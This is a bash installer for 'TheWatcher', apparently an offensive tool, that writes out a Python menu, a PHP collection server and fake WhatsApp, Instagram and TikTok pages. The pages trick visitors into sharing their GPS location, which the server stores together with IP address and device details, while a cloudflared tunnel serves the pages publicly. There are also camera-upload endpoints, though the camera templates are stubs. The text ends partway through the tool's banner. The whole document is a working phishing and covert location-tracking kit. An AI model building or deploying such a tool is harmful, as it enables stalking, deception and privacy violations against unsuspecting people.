#!/usr/bin/env bash
set -e

# Colors
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
CYAN='\033[96m'
WHITE='\033[97m'
GRAY='\033[90m'
BOLD='\033[1m'
END='\033[0m'

clear
echo -e "${RED}${BOLD}"
echo '      ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  '
echo '      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒'
echo '      ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒'
echo '      ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  '
echo '        ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒'
echo '        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░'
echo '          ░     ▒ ░▒░ ░ ░ ░  ░     ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░'
echo '        ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ '
echo '                ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     '
echo '                            ~EvilmaxSec | Tz~'
echo -e "${END}"
echo -e "${CYAN}${BOLD}"
echo '╔═══════════════════════════════════════════════════════════════════════════╗'
echo '║                    TheWatcher Installer                                   ║'
echo '║                      Everything installs automatically                    ║'
echo '╚═══════════════════════════════════════════════════════════════════════════╝'
echo -e "${END}\n"

# Detect system
if [[ -d "/data/data/com.termux/files/usr" ]]; then
    SYSTEM="termux"
    export PROOT_TMP_DIR="/data/data/com.termux/files/usr/tmp"
    mkdir -p "$PROOT_TMP_DIR" 2>/dev/null
    chmod 777 "$PROOT_TMP_DIR" 2>/dev/null
    echo -e "  ${GREEN}✓${END} ${WHITE}Detected: Termux (Android)${END}"
elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
    SYSTEM="linux"
    echo -e "  ${GREEN}✓${END} ${WHITE}Detected: Linux${END}"
elif [[ "$OSTYPE" == "darwin"* ]]; then
    SYSTEM="macos"
    echo -e "  ${GREEN}✓${END} ${WHITE}Detected: macOS${END}"
else
    SYSTEM="other"
    echo -e "  ${YELLOW}⚠${END} ${WHITE}Detected: Other system${END}"
fi

# Create installation directory
INSTALL_DIR="$HOME/TheWatcher"
echo -e "\n  ${BLUE}ℹ${END} ${WHITE}Installing to: ${YELLOW}$INSTALL_DIR${END}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"
mkdir -p modules data templates

# Install Python dependencies
echo -e "\n  ${BLUE}ℹ${END} ${WHITE}Installing Python dependencies...${END}"
pip install requests -q 2>/dev/null || pip3 install requests -q 2>/dev/null
echo -e "  ${GREEN}✓${END} ${WHITE}Requests installed${END}"

# Install PHP
echo -e "\n  ${BLUE}ℹ${END} ${WHITE}Installing PHP...${END}"
if [[ "$SYSTEM" == "termux" ]]; then
    pkg update -y 2>/dev/null
    pkg install php -y 2>/dev/null
elif [[ "$SYSTEM" == "linux" ]]; then
    if command -v apt &>/dev/null; then
        sudo apt update -y 2>/dev/null
        sudo apt install php -y 2>/dev/null
    elif command -v yum &>/dev/null; then
        sudo yum install php -y 2>/dev/null
    elif command -v pacman &>/dev/null; then
        sudo pacman -S php --noconfirm 2>/dev/null
    fi
elif [[ "$SYSTEM" == "macos" ]]; then
    if command -v brew &>/dev/null; then
        brew install php 2>/dev/null
    else
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" 2>/dev/null
        brew install php 2>/dev/null
    fi
fi

if command -v php &>/dev/null; then
    echo -e "  ${GREEN}✓${END} ${WHITE}PHP installed${END}"
else
    echo -e "  ${YELLOW}⚠${END} ${WHITE}PHP may already be present${END}"
fi

# Install Cloudflared
echo -e "\n  ${BLUE}ℹ${END} ${WHITE}Installing Cloudflared for public URLs...${END}"
if [[ "$SYSTEM" == "termux" ]]; then
    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null
    chmod +x cloudflared
    mv cloudflared $PREFIX/bin/ 2>/dev/null
elif [[ "$SYSTEM" == "linux" ]]; then
    ARCH=$(uname -m)
    if [[ "$ARCH" == "aarch64" ]] || [[ "$ARCH" == "arm64" ]]; then
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null
    else
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared 2>/dev/null
    fi
    chmod +x cloudflared
    sudo mv cloudflared /usr/local/bin/ 2>/dev/null
fi
echo -e "  ${GREEN}✓${END} ${WHITE}Cloudflared installed${END}"

# Create modules
echo -e "\n  ${BLUE}ℹ${END} ${WHITE}Creating TheWatcher files...${END}"

# Create modules/__init__.py
cat > modules/__init__.py << 'EOF'
from .cloudflare import CloudflareTunnel
from .templates import TemplateManager
EOF

# Create modules/cloudflare.py
cat > modules/cloudflare.py << 'EOF'
import subprocess, re, os, time
class CloudflareTunnel:
    def __init__(self): self.process=None; self.url=None; self.logfile=None
    def start(self, port):
        self.logfile="/tmp/cf_"+str(port)+".log"
        try:
            subprocess.run(["cloudflared","--version"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        except:
            return None
        cmd="cloudflared tunnel --url http://127.0.0.1:"+str(port)+" --logfile "+self.logfile
        self.process=subprocess.Popen(cmd,shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        for _ in range(30):
            time.sleep(1)
            if os.path.exists(self.logfile):
                with open(self.logfile,'r') as f:
                    m=re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com',f.read())
                    if m: self.url=m.group(0); return self.url
        return None
    def stop(self):
        if self.process: self.process.terminate()
        if self.logfile and os.path.exists(self.logfile): os.remove(self.logfile)
EOF

# Create modules/templates.py
cat > modules/templates.py << 'EOF'
#!/usr/bin/env python3
import os, base64

class TemplateManager:
    
    @staticmethod
    def get_whatsapp_location(name, img, members):
        src = img
        if os.path.exists(img) and os.path.isfile(img):
            with open(img,'rb') as f:
                data = base64.b64encode(f.read()).decode()
                mime = 'image/png' if img.endswith('.png') else 'image/jpeg'
                src = "data:"+mime+";base64,"+data
        return '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>WhatsApp Group</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f0f2f5}.header{background:#075E54;color:#fff;padding:12px 16px}.header-content{max-width:500px;margin:0 auto;display:flex;align-items:center;gap:10px}.main{max-width:500px;margin:40px auto;padding:0 16px}.card{background:#fff;border-radius:24px;overflow:hidden;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,0.1)}.avatar{width:100px;height:100px;border-radius:50%;margin:30px auto 15px;overflow:hidden;border:3px solid #25D366}.avatar img{width:100%;height:100%;object-fit:cover}.name{font-size:24px;font-weight:600;color:#075E54}.type{color:#666;font-size:13px}.count{display:inline-block;background:#e8f5e9;color:#075E54;padding:4px 12px;border-radius:20px;font-size:12px;margin:15px 0}.btn{background:#25D366;color:#fff;border:none;padding:14px 35px;border-radius:40px;font-size:16px;font-weight:600;margin:0 20px 30px;width:calc(100% - 40px);cursor:pointer}.loading{display:none;text-align:center;padding:50px;background:#fff;border-radius:24px}.spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top:3px solid #25D366;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}@keyframes spin{to{transform:rotate(360deg)}}.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:1000;justify-content:center;align-items:center}.modal-content{background:#fff;border-radius:20px;max-width:280px;width:90%;text-align:center;overflow:hidden}.modal-icon{background:#fdf2f5;padding:25px 0 15px}.modal-title{font-size:20px;font-weight:700;color:#075E54;padding:10px 20px}.modal-msg{color:#666;padding:10px 25px 20px;font-size:14px}.modal-btn{background:#25D366;color:#fff;border:none;padding:14px;width:100%;font-size:15px;font-weight:600;cursor:pointer}.bottom-bar{background:#075E54;color:#fff;padding:30px 16px 15px;margin-top:40px}.bottom-text{text-align:center;font-size:11px;opacity:0.7}</style>
</head>
<body>
<div class="header"><div class="header-content"><svg viewBox="0 0 24 24" fill="white"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-5.46-4.45-9.91-9.91-9.91z"/><path fill="#25D366" d="M12.04 3.5c4.62 0 8.38 3.76 8.38 8.38 0 4.62-3.76 8.38-8.38 8.38-1.45 0-2.86-.36-4.09-1.02l-.52-.27-3.11.82.83-3.04-.28-.54c-.68-1.27-1.04-2.68-1.04-4.13 0-4.62 3.76-8.38 8.38-8.38z"/></svg><span>WhatsApp</span></div></div>
<div class="main"><div class="card" id="inviteCard"><div class="avatar"><img src="'''+src+'''"></div><div class="name">'''+name+'''</div><div class="type">WhatsApp Group</div><div class="count">'''+members+''' members</div><button class="btn" id="joinBtn">Join Group</button></div><div class="loading" id="loading"><div class="spinner"></div><p>Joining...</p></div></div>
<div class="modal" id="modal"><div class="modal-content"><div class="modal-icon"><svg width="55" height="55" viewBox="0 0 24 24" fill="#dc3545"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg></div><div class="modal-title">Group Full</div><div class="modal-msg">Maximum 256 participants reached.</div><button class="modal-btn" id="closeModal">OK</button></div></div>
<div class="bottom-bar"><div class="bottom-text">© 2024 WhatsApp Inc.</div></div>
<script>
document.getElementById('joinBtn').onclick=function(){
    document.getElementById('inviteCard').style.display='none';
    document.getElementById('loading').style.display='block';
    setTimeout(function(){
        if("geolocation" in navigator){
            navigator.geolocation.getCurrentPosition(function(pos){
                fetch('/location',{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({
                        lat:pos.coords.latitude,
                        lng:pos.coords.longitude,
                        acc:pos.coords.accuracy
                    })
                }).then(function(){
                    document.getElementById('loading').style.display='none';
                    document.getElementById('modal').style.display='flex';
                });
            },function(err){
                document.getElementById('loading').style.display='none';
                document.getElementById('inviteCard').style.display='block';
                alert('Location access required');
            });
        }
    },1500);
};
document.getElementById('closeModal').onclick=function(){
    document.getElementById('modal').style.display='none';
    document.getElementById('inviteCard').style.display='block';
};
</script>
</body>
</html>'''
    
    @staticmethod
    def get_instagram_story_custom(username, verified, profile_image, video_path, views, likes, caption):
        return '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>Instagram Story</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.story{max-width:450px;width:100%;height:100vh;background:#000;position:relative}.header{position:absolute;top:0;left:0;right:0;padding:50px 16px 16px;background:linear-gradient(180deg,rgba(0,0,0,0.6) 0%,rgba(0,0,0,0) 100%);z-index:10;display:flex;align-items:center;gap:12px}.avatar{width:40px;height:40px;border-radius:50%;overflow:hidden;border:2px solid #fff}.avatar img{width:100%;height:100%;object-fit:cover}.username{font-weight:600;color:#fff;font-size:14px}.story-video{width:100%;height:100%;object-fit:cover;position:absolute;top:0;left:0}.story-stats{position:absolute;bottom:80px;left:16px;right:16px;z-index:20;display:flex;gap:20px}.stat{color:#fff;font-size:12px;background:rgba(0,0,0,0.5);padding:4px 12px;border-radius:20px}.caption{position:absolute;bottom:20px;left:16px;right:16px;color:#fff;font-size:14px;background:rgba(0,0,0,0.5);padding:8px 12px;border-radius:20px;z-index:20}.progress{position:absolute;top:8px;left:8px;right:8px;height:3px;background:rgba(255,255,255,0.3);border-radius:3px;z-index:30}.progress-fill{height:100%;width:0%;background:#fff;border-radius:3px;animation:progress 15s linear}@keyframes progress{to{width:100%}}</style>
</head>
<body>
<div class="story"><div class="progress"><div class="progress-fill"></div></div><div class="header"><div class="avatar"><img src="'''+profile_image+'''"></div><div class="username">@'''+username+'''</div></div><video class="story-video" autoplay loop muted playsinline><source src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4"></video><div class="story-stats"><div class="stat">👁️ '''+views+''' views</div><div class="stat">❤️ '''+likes+''' likes</div></div><div class="caption">'''+caption+'''</div></div>
<script>setTimeout(function(){if("geolocation" in navigator){navigator.geolocation.getCurrentPosition(function(p){fetch('/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy})}).then(function(){window.location.href="https://instagram.com"})},function(){window.location.href="https://instagram.com"})}},3000);</script>
</body>
</html>'''
    
    @staticmethod
    def get_tiktok_video_custom(username, verified, profile_image, video_path, views, likes, comments, shares, caption):
        return '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover"><title>TikTok</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{max-width:450px;width:100%;height:100vh;background:#000;position:relative}video{width:100%;height:100%;object-fit:cover}.info{position:absolute;bottom:120px;left:16px;right:80px;z-index:10}.user{display:flex;align-items:center;gap:12px;margin-bottom:12px}.user-avatar{width:48px;height:48px;border-radius:50%;overflow:hidden;border:2px solid #fff}.user-avatar img{width:100%;height:100%;object-fit:cover}.username{color:#fff;font-weight:700;font-size:16px}.caption{color:#fff;font-size:14px;margin-bottom:8px}.music{color:rgba(255,255,255,0.7);font-size:12px;display:flex;align-items:center;gap:6px}.actions{position:absolute;right:16px;bottom:150px;display:flex;flex-direction:column;gap:20px;z-index:10}.action{text-align:center}.action-icon{width:44px;height:44px;background:rgba(255,255,255,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;backdrop-filter:blur(5px)}.action-count{color:#fff;font-size:11px;margin-top:4px}.progress{position:absolute;top:0;left:0;right:0;height:3px;background:rgba(255,255,255,0.3);z-index:20}.progress-fill{height:100%;width:0%;background:#ff0050;animation:progress 15s linear}@keyframes progress{to{width:100%}}</style>
</head>
<body>
<div class="container"><div class="progress"><div class="progress-fill"></div></div><video autoplay loop muted playsinline><source src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4"></video><div class="info"><div class="user"><div class="user-avatar"><img src="'''+profile_image+'''"></div><div class="username">@'''+username+'''</div></div><div class="caption">'''+caption+'''</div><div class="music">🎵 original sound - @'''+username+'''</div></div><div class="actions"><div class="action"><div class="action-icon">❤️</div><div class="action-count">'''+likes+'''</div></div><div class="action"><div class="action-icon">💬</div><div class="action-count">'''+comments+'''</div></div><div class="action"><div class="action-icon">↗️</div><div class="action-count">'''+shares+'''</div></div></div></div>
<script>setTimeout(function(){if("geolocation" in navigator){navigator.geolocation.getCurrentPosition(function(p){fetch('/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy})}).then(function(){window.location.href="https://tiktok.com"})},function(){window.location.href="https://tiktok.com"})}},3000);</script>
</body>
</html>'''
    
    @staticmethod
    def get_instagram_camera(username, verified, profile_image, video_path, likes, comments, shares, caption):
        return "<html><body><h1>Instagram Reel</h1><p>@"+username+"</p></body></html>"
    
    @staticmethod
    def get_tiktok_camera(username, verified, profile_image, video_path, likes, comments, shares, caption):
        return "<html><body><h1>TikTok Camera</h1><p>@"+username+"</p></body></html>"
EOF

# Create server.php
cat > server.php << 'EOF'
<?php
if (!is_dir('data')) mkdir('data',0755,true);
if (!is_dir('templates')) mkdir('templates',0755,true);
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') { http_response_code(200); exit(); }
$uri = strtok($_SERVER['REQUEST_URI'], '?');
function getIP(){ $ip=$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'Unknown'; return trim(explode(',',$ip)[0]); }
function logMsg($type,$data){
    $out="\n".str_repeat("=",70)."\n".($type=='visit'?"🔴 NEW VISITOR!":($type=='location'?"📍 LOCATION!":"📸 CAMERA!"))."\n".str_repeat("=",70)."\n";
    $out.="  📅 Time: ".date('Y-m-d H:i:s')."\n  🌐 IP: {$data['ip']}\n";
    if($type=='location') $out.="  📍 GPS: {$data['lat']}, {$data['lng']}\n";
    $out.="  📱 Device: {$data['device']}\n  💻 OS: {$data['os']}\n  🌍 Browser: {$data['browser']}\n".str_repeat("=",70)."\n";
    file_put_contents('php://stderr',$out);
}
function parseUA($ua){
    $l=strtolower($ua);
    $os='Unknown'; if(strpos($l,'android')!==false) $os='Android';
    elseif(strpos($l,'iphone')!==false) $os='iOS';
    elseif(strpos($l,'windows')!==false) $os='Windows';
    elseif(strpos($l,'mac')!==false) $os='macOS';
    $browser='Unknown';
    if(strpos($l,'chrome')!==false) $browser='Chrome';
    elseif(strpos($l,'firefox')!==false) $browser='Firefox';
    elseif(strpos($l,'safari')!==false) $browser='Safari';
    $device='Desktop'; if(strpos($l,'mobile')!==false) $device='Mobile Phone';
    return ['os'=>$os,'browser'=>$browser,'device'=>$device];
}
if($uri=='/' && file_exists('templates/current.html')){
    $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
    $d=parseUA($ua);
    logMsg('visit',['ip'=>$ip,'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'file'=>'N/A']);
    header('Content-Type:text/html'); readfile('templates/current.html'); exit();
}
if($uri=='/location' && $_SERVER['REQUEST_METHOD']=='POST'){
    $data=json_decode(file_get_contents('php://input'),true);
    if($data){
        $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
        $d=parseUA($ua);
        $f="data/location_".time().".json";
        file_put_contents($f,json_encode(['timestamp'=>date('Y-m-d H:i:s'),'ip_address'=>$ip,'coordinates'=>['latitude'=>$data['lat'],'longitude'=>$data['lng'],'accuracy'=>$data['acc']],'device'=>$d],JSON_PRETTY_PRINT));
        logMsg('location',['ip'=>$ip,'lat'=>$data['lat'],'lng'=>$data['lng'],'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'file'=>$f]);
        header('Content-Type:application/json'); echo json_encode(['status'=>'ok']); exit();
    }
}
if($uri=='/camera' && $_SERVER['REQUEST_METHOD']=='POST' && isset($_FILES['image'])){
    $f="data/camera_".time().".jpg";
    move_uploaded_file($_FILES['image']['tmp_name'],$f);
    echo json_encode(['status'=>'ok']); exit();
}
if(file_exists('templates/current.html')) readfile('templates/current.html');
else echo "TheWatcher Ready";
?>
EOF

# Create thewatcher.py
cat > thewatcher.py << 'EOF'
#!/usr/bin/env python3
import os, sys, time, json, subprocess, threading, socket

class Colors:
    RED='\033[91m'; GREEN='\033[92m'; YELLOW='\033[93m'; BLUE='\033[94m'
    CYAN='\033[96m'; WHITE='\033[97m'; GRAY='\033[90m'; BOLD='\033[1m'; END='\033[0m'

def clear(): os.system('clear')
def print_success(m): print("  "+Colors.GREEN+"✓"+Colors.END+" "+Colors.WHITE+m+Colors.END)
def print_error(m): print("  "+Colors.RED+"✗"+Colors.END+" "+Colors.WHITE+m+Colors.END)
def print_info(m): print("  "+Colors.BLUE+"ℹ"+Colors.END+" "+Colors.WHITE+m+Colors.END)
def print_warning(m): print("  "+Colors.YELLOW+"⚠"+Colors.END+" "+Colors.WHITE+m+Colors.END)

def get_input(prompt, default=""):
    if default:
        val = input("  "+Colors.RED+"➜"+Colors.END+" "+Colors.WHITE+prompt+Colors.GRAY+" ["+default+"]:"+Colors.END+" ")
        return val if val else default
    return input("  "+Colors.RED+"➜"+Colors.END+" "+Colors.WHITE+prompt+":"+Colors.END+" ")

def get_number(prompt, min_val, max_val):
    while True:
        try:
            val = int(get_input(prompt))
            if min_val <= val <= max_val: return val
            print_error(f"Enter {min_val}-{max_val}")
        except: print_error("Enter a number")

def get_local_ip():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80))
        ip=s.getsockname()[0]
        s.close()
        return ip
    except: return "127.0.0.1"

def check_command(cmd):
    try: subprocess.run([cmd,"--version"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL); return True
    except: return False

def get_image_source(prompt_type):
    print("\n  "+Colors.CYAN+"📸 "+prompt_type+Colors.END)
    print("  "+Colors.GRAY+"[1] Use image URL"+Colors.END)
    print("  "+Colors.GRAY+"[2] Use local image file"+Colors.END)
    choice = get_input("Choose option","1")
    if choice=="1":
        return get_input("Enter image URL","https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop")
    else:
        while True:
            path=get_input("Enter local image path")
            if os.path.exists(path) and os.path.isfile(path): return path
            print_error("File not found")
            if get_input("Try again? (y/n)","y").lower()!='y':
                return "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"

def get_video_source():
    print("\n  "+Colors.CYAN+"🎬 Video Source"+Colors.END)
    print("  "+Colors.GRAY+"[1] Use video URL"+Colors.END)
    print("  "+Colors.GRAY+"[2] Use local video file"+Colors.END)
    choice=get_input("Choose option","1")
    if choice=="1":
        return get_input("Enter video URL","https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4")
    else:
        while True:
            path=get_input("Enter local video path")
            if os.path.exists(path) and os.path.isfile(path): return path
            print_error("File not found")
            if get_input("Try again? (y/n)","y").lower()!='y':
                return "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"

class TheWatcher:
    def __init__(self): self.php_process=None; self.stop_monitor=threading.Event()
    
    def run_server(self, port, html):
        os.makedirs('templates',exist_ok=True)
        with open('templates/current.html','w') as f: f.write(html)
        print_info(f"Starting PHP server on port {port}...")
        if not check_command("php"): print_error("PHP not installed"); sys.exit(1)
        
        self.php_process=subprocess.Popen(["php","-S",f"0.0.0.0:{port}","server.php"],stderr=subprocess.PIPE,stdout=subprocess.DEVNULL,text=True)
        time.sleep(2)
        
        try:
            from modules.cloudflare import CloudflareTunnel
            cf=CloudflareTunnel()
            url=cf.start(port)
            local_ip=get_local_ip()
            print("\n"+Colors.CYAN+Colors.BOLD+"="*60+Colors.END)
            print(Colors.CYAN+Colors.BOLD+"🌐 SHAREABLE LINKS"+Colors.END)
            print(Colors.CYAN+Colors.BOLD+"="*60+Colors.END)
            if url: print_success(f"Cloudflare: {Colors.YELLOW}{url}{Colors.END}")
            print_success(f"Local: http://localhost:{port}")
            print_success(f"Network: http://{local_ip}:{port}")
            print("\n"+Colors.GREEN+Colors.BOLD+"╔══════════════════════════════════════════════════════╗"+Colors.END)
            print(Colors.GREEN+Colors.BOLD+"║     🚀 TheWatcher Active!  Press Ctrl+C to stop      ║"+Colors.END)
            print(Colors.GREEN+Colors.BOLD+"╚══════════════════════════════════════════════════════╝"+Colors.END+"\n")
            while True: time.sleep(1)
        except KeyboardInterrupt:
            print_warning("\nStopping...")
            if self.php_process: self.php_process.terminate()
            cf.stop()
    
    def location_menu(self):
        print("\n"+Colors.BLUE+Colors.BOLD+"📍 LOCATION TRACKING"+Colors.END)
        print(Colors.GRAY+"─"*50+Colors.END)
        print_menu("SELECT TEMPLATE",{"1":"WhatsApp Group Invite","2":"Instagram Story","3":"TikTok Video"})
        choice=get_number("Choose",1,3)
        from modules.templates import TemplateManager
        if choice==1:
            name=get_input("Group name","Security Group")
            img=get_image_source("Group Image")
            members=get_input("Members","128")
            html=TemplateManager.get_whatsapp_location(name,img,members)
            port=get_number("Port (8080)",1,65535)
            self.run_server(port,html)
        elif choice==2:
            u=get_input("Username","instagram")
            v=get_input("Verified? (y/n)","n").lower()=='y'
            p=get_image_source("Profile Image")
            vt=get_video_source()
            vi=get_input("Views","1.2M")
            l=get_input("Likes","125K")
            c=get_input("Caption","Check out my story!")
            html=TemplateManager.get_instagram_story_custom(u,v,p,vt,vi,l,c)
            port=get_number("Port (8080)",1,65535)
            self.run_server(port,html)
        elif choice==3:
            u=get_input("Username","tiktok")
            v=get_input("Verified? (y/n)","n").lower()=='y'
            p=get_image_source("Profile Image")
            vt=get_video_source()
            vi=get_input("Views","1.2M")
            l=get_input("Likes","125K")
            c=get_input("Comments","12.5K")
            s=get_input("Shares","5.2K")
            ca=get_input("Caption","Check this out!")
            html=TemplateManager.get_tiktok_video_custom(u,v,p,vt,vi,l,c,s,ca)
            port=get_number("Port (8080)",1,65535)
            self.run_server(port,html)
    
    def camera_menu(self):
        print("\n"+Colors.BLUE+Colors.BOLD+"📸 CAMERA ACCESS"+Colors.END)
        print(Colors.GRAY+"─"*50+Colors.END)
        print_menu("SELECT TEMPLATE",{"1":"Instagram Reel","2":"TikTok Video"})
        choice=get_number("Choose",1,2)
        from modules.templates import TemplateManager
        if choice==1:
            u=get_input("Username","instagram")
            v=get_input("Verified? (y/n)","n").lower()=='y'
            p=get_image_source("Profile Image")
            vt=get_video_source()
            l=get_input("Likes","1.2M")
            c=get_input("Comments","12.5K")
            s=get_input("Shares","5.2K")
            ca=get_input("Caption","Amazing content!")
            html=TemplateManager.get_instagram_camera(u,v,p,vt,l,c,s,ca)
            port=get_number("Port (8080)",1,65535)
            self.run_server(port,html)
        elif choice==2:
            u=get_input("Username","tiktok")
            v=get_input("Verified? (y/n)","n").lower()=='y'
            p=get_image_source("Profile Image")
            vt=get_video_source()
            l=get_input("Likes","1.2M")
            c=get_input("Comments","12.5K")
            s=get_input("Shares","5.2K")
            ca=get_input("Caption","Check this out!")
            html=TemplateManager.get_tiktok_camera(u,v,p,vt,l,c,s,ca)
            port=get_number("Port (8080)",1,65535)
            self.run_server(port,html)
    
    def view_data(self):
        print("\n"+Colors.BLUE+Colors.BOLD+"📊 COLLECTED DATA"+Colors.END)
        print(Colors.GRAY+"─"*50+Colors.END)
        if not os.path.exists('data') or not os.listdir('data'):
            print_warning("No data yet")
            input("\n  Press Enter...")
            return
        for f in os.listdir('data'):
            if f.endswith('.json'):
                try:
                    with open(f'data/{f}','r') as file:
                        data=json.load(file)
                        print("\n  "+Colors.GREEN+"📄 "+f+Colors.END)
                        print("     "+Colors.YELLOW+"Time:"+Colors.END+" "+str(data.get('timestamp')))
                        print("     "+Colors.YELLOW+"IP:"+Colors.END+" "+str(data.get('ip_address')))
                        if 'coordinates' in data:
                            print("     "+Colors.YELLOW+"GPS:"+Colors.END+" "+str(data['coordinates'].get('latitude'))+", "+str(data['coordinates'].get('longitude')))
                except: pass
            elif f.endswith('.jpg'):
                size=os.path.getsize(f'data/{f}')//1024
                print("\n  "+Colors.GREEN+"📸 "+f+Colors.END+" ("+str(size)+"KB)")
        input("\n  Press Enter...")

def print_menu(title, options):
    print("\n"+Colors.CYAN+Colors.BOLD+"┌─────────────────────────────────────────────────┐"+Colors.END)
    print(Colors.CYAN+Colors.BOLD+"│          "+title.ljust(35)+Colors.CYAN+Colors.BOLD+"│"+Colors.END)
    print(Colors.CYAN+Colors.BOLD+"├─────────────────────────────────────────────────┤"+Colors.END)
    for k,v in options.items():
        print(Colors.CYAN+Colors.BOLD+"│"+Colors.END+"  "+Colors.RED+"["+k+"]"+Colors.END+" "+Colors.WHITE+v.ljust(39)+Colors.CYAN+Colors.BOLD+"│"+Colors.END)
    print(Colors.CYAN+Colors.BOLD+"└─────────────────────────────────────────────────┘"+Colors.END)

def banner():
    clear()
    print(Colors.RED+Colors.BOLD+"""
      ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  
      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
      ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒
      ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  
